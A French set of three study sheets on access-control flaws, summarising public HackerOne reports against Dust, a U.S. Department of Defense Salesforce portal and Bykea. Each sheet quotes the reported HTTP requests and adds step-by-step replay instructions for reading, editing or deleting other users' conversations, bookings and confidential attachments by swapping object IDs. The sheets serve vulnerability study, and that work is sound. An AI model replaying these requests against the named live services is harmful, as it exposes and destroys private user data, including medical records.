# Fiches SSS — Access Control & IDOR

*3 fiches SSS rejouables, tirées de cas réels du corpus 2025-2026.*

### Privilege Escalation leads to Unauthorized Access to Private Conversations [Read, Edit, Delete] (Dust)

**📄 Cas réel**
sévérité : critical · [source](https://hackerone.com/reports/3103849)

Un utilisateur authentifié ordinaire de dust.tt escalade ses privilèges via l'API des conversations d'assistant. En ciblant l'ID de conversation d'un autre utilisateur — y compris admin — il peut la lire (GET), la modifier (PATCH : titre, visibilité) et la supprimer définitivement (DELETE), sans permission particulière. Les réponses JSON exposent l'owner, le contenu des messages, e-mails et identités des participants. Impact : confidentialité, intégrité et disponibilité des conversations privées du workspace.

**Cause racine :** L'endpoint `/api/w/<Workspace-id>/assistant/conversations/<id>` ne revalide pas côté serveur que la conversation appartient à l'appelant — « No additional verification is performed server-side to confirm ownership of the conversation. »

**Preuve technique (verbatim depuis la source) :**

```
GET /api/w/mRHt1cXVmK/assistant/conversations/<ADMIN-conversation-id> HTTP/2
Host: dust.tt
Cookie: <User-session_token_or_cookies>
...
DELETE /api/w/mRHt1cXVmK/assistant/conversations/<ADMIN-conversation-id> HTTP/2
Host: dust.tt
Cookie: <User-session_token_or_cookies>
...
PATCH /api/w/[Workspace ID]/assistant/conversations/[Conversation ID]
Content-Type: application/json
Cookie: <User-session_token_or_cookies>

{
  "title": "Updated by Attacker",
   "visibility":"unlisted"
}
```

**Rejouer / exploiter (dérivé de la source) :**
- Prérequis : compte authentifié (session token/cookies) sur le même workspace dust.tt que la victime ; identifiant de conversation de la victime.
- Étapes : 1. S'authentifier et relever son workspace id (`/api/w/<Workspace-id>/…`). 2. Envoyer `GET /api/w/<Workspace-id>/assistant/conversations/<victim-conversation-id>` et constater le retour du contenu privé. 3. Rejouer avec `DELETE` pour supprimer, ou `PATCH` avec `{"title":…,"visibility":"unlisted"}` pour modifier la conversation ciblée.
- Pièges / limites : non documenté dans la source (ni WAF, ni rate limit ; entropie des IDs de conversation non discutée).

**Reproductibilité :** moyenne — compte authentifié et identifiant de conversation de la victime nécessaires, mais requêtes exactes fournies.

**Techniques :** idor, broken access control, privilege escalation, api rest manipulation, missing ownership check, cross-user data modification

**Correspond aux classes qualifiantes :** idor, broken access control, privilege escalation

**Signal (endpoints/fonctions observés) :**
- `GET/DELETE/PATCH /api/w/<Workspace-id>/assistant/conversations/<conversation-id>`

**Paramètres impliqués :** `Workspace-id`, `conversation-id`, `title`, `visibility`

---

### Applicant Attachments/Documents accessible via IDOR on custom Apex controller (U.S. Dept Of Defense)

**📄 Cas réel**
sévérité : critical · [source](https://hackerone.com/reports/2950536)

Portail Salesforce du DoD : un contrôleur Apex custom expose l'action `cloneAttachment`, qui reclone une pièce jointe (`Attachment`) arbitraire vers un enregistrement choisi par l'attaquant. En énumérant les IDs Salesforce (prévisibles) puis en liant la pièce jointe à son propre Contact, l'attaquant en obtient la lecture — les pièces jointes contiennent les dossiers de vérification, dont des données médicales personnelles. Le rapport signale un accès involontaire à un enregistrement confidentiel pendant le test.

**Cause racine :** L'action Apex `cloneAttachment` accepte `attachmentId` et `parentId` arbitraires sans vérifier les droits de l'appelant sur la pièce jointe : « An attacker can switch the ownership of any Attachment record ».

**Preuve technique (verbatim depuis la source) :**

```
1. Generate/enumerate a list of Salesforce Attachment Id's. These are highly predictable: example methodology/script here: https://blog.hypn.za.net/2022/11/12/Hacking-Salesforce-backed-WebApps/.
2. Plug the generated list of Id's into the broken Apex controller (apex://ExAM.FileUploadController/ACTION$cloneAttachment), clone any Attachment record within the CRM and link it to a record they own (e.g. their own Contact). This gives read access to the record.
3. Download the newly-linked Attachment as their own via a servlet/servlet.FileDownload?file=* request.
...
"descriptor":"apex://ExAM.FileUploadController/ACTION$cloneAttachment","callingDescriptor":"markup://ExAM:AssessmentViewer","params":{"attachmentId":"00PRw000000MaT3MAK","parentId":"003Rw000002SJcsIAG"}
...
https://█████.mil/Portal██████████/servlet/servlet.FileDownload?file=00PRw000000MbSLMA0
```

**Rejouer / exploiter (dérivé de la source) :**
- Prérequis : compte portail créé, vérifié par e-mail et mot de passe changé (session avec `aura.token` et cookies) ; liste d'IDs `Attachment` Salesforce générée au préalable.
- Étapes : 1. Créer et valider un compte portail, s'y connecter. 2. Capturer un POST `sfsites/aura` contenant `aura.token`. 3. Rejouer `SelectableListDataProviderController/ACTION$getItems` avec `entityNameOrId:"Contact"` pour obtenir son Contact id. 4. Appeler `apex://ExAM.FileUploadController/ACTION$cloneAttachment` avec `attachmentId` victime et `parentId` = son Contact id. 5. Lister les `Attachment` accessibles, copier le nouvel id, télécharger via `servlet/servlet.FileDownload?file=<id>`.
- Pièges / limites : IDs Salesforce prévisibles nécessitant énumération (méthodologie liée) ; les enregistrements touchés restent confidentiels (le rapport demande la suppression du lien de test).

**Reproductibilité :** moyenne — création de compte portail et énumération d'IDs requis ; chaîne et requêtes complètes fournies.

**Techniques :** idor, broken access control, salesforce aura, apex action abuse, predictable ids enumeration, ownership transfer

**Correspond aux classes qualifiantes :** idor, broken access control, info disclosure

**Signal (endpoints/fonctions observés) :**
- `POST /Portal…/s/sfsites/aura` (`aura.token`, `message`)
- `apex://ExAM.FileUploadController/ACTION$cloneAttachment`
- `serviceComponent://…SelectableListDataProviderController/ACTION$getItems` (`entityNameOrId: Contact|Attachment`)
- `GET /Portal…/servlet/servlet.FileDownload?file=<id>`

**Paramètres impliqués :** `attachmentId`, `parentId`, `aura.token`, `file`

---

### IDOR in Booking Detail and Bids leads to Sensitive Information Disclosure (Bykea)

**📄 Cas réel**
sévérité : high · [source](https://hackerone.com/reports/2374730)

Les API Bykea exposent les détails de réservation, les bids et leur configuration à partir du `booking_id`, sans vérifier qu'il appartient à l'appelant. Avec deux comptes (attaquant/victime), l'attaquant récupère la course de la victime : pickup/dropoff, adresses, fares, statut, bids, lien de tracking. Les requêtes portent l'identité de l'attaquant (`_id`/`token_id`) tandis que l'objet ciblé est identifié par l'ID de la victime.

**Cause racine :** Les handlers (`/api/v1/bookings/<id>`, `/api/v2/bids/<id>`, `/v1/config?trip_id=`) ne contrôlent pas la propriété du booking par rapport au token appelant : « the booking_id in the request URL is vulnerable to IDOR ».

**Preuve technique (verbatim depuis la source) :**

```
1. GET https://api.bykea.net/api/v1/bookings/{{booking_id}}?_id={{user_id2}}&token_id={{access_token2}}
2. GET https://api.bykea.net/api/v2/bids/{{booking_id}}?_id={{user_id2}}&token_id={{access_token2}}
3. GET https://boleelagao.bykea.net/v1/config?lat={{latitute}}&lng={{longitude}}&service_code=23&trip_id={{booking_id}}
...
GET https://api.bykea.net/api/v1/bookings/███?_id={{user_id2}}&token_id={{access_token2}}
...
X-Lb-User-Id: {{user_id2}}
X-Lb-User-Token: {{access_token2}}
```

**Rejouer / exploiter (dérivé de la source) :**
- Prérequis : deux comptes passagers avec `user_id`/`access_token` valides ; un booking créé par la victime.
- Étapes : 1. Créer un trip côté victime (`POST /api/v1/trips/create`) et relever son id. 2. S'authentifier côté attaquant pour obtenir `user_id2`/`access_token2`. 3. Appeler `GET /api/v1/bookings/<victim_booking_id>?_id=<attaquant>&token_id=<attaquant>` : détails complets renvoyés. 4. Idem pour `/api/v2/bids/<id>` (bids) et `/v1/config?…&trip_id=<id>` avec en-têtes `X-Lb-User-Id`/`X-Lb-User-Token` (config de bids).
- Pièges / limites : le rapport note des bids vides car la réservation de test avait été annulée — « in a real-life scenario, it should be filled up with bids from the partner/ driver » ; ni WAF ni rate limit mentionnés.

**Reproductibilité :** moyenne — deux comptes et un booking victime requis ; étapes et requêtes complètes.

**Techniques :** idor, broken access control, mobile api, user-supplied ids, missing ownership validation, sensitive data exposure

**Correspond aux classes qualifiantes :** idor, broken access control, privacy leak

**Signal (endpoints/fonctions observés) :**
- `GET https://api.bykea.net/api/v1/bookings/<booking_id>`
- `GET https://api.bykea.net/api/v2/bids/<booking_id>`
- `GET https://boleelagao.bykea.net/v1/config?trip_id=<booking_id>`
- En-têtes mobiles `User-Agent: BYKEA/…`, `X-App-Version: 1.0.169`

**Paramètres impliqués :** `booking_id`, `_id`, `token_id`, `trip_id`, `X-Lb-User-Id`, `X-Lb-User-Token`
